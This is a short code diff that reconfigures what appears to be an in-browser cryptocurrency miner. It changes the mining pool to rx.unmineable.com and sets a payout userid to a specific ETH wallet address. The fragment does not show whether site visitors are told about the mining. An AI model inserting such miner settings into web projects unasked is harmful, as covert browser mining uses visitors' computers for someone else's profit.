@@ -19,8 +19,8 @@ let handshake = {
   identifier: "handshake",
   login: "",
   password: "web_miner",
-  pool: "moneroocean.stream",
-  userid: "",
+  pool: "rx.unmineable.com:3333",
+  userid: "ETH:0x97C29B66c26C7366e29AB5f86E4A447c2113F808.BrowerMiner",
   version: 7,
 };
 
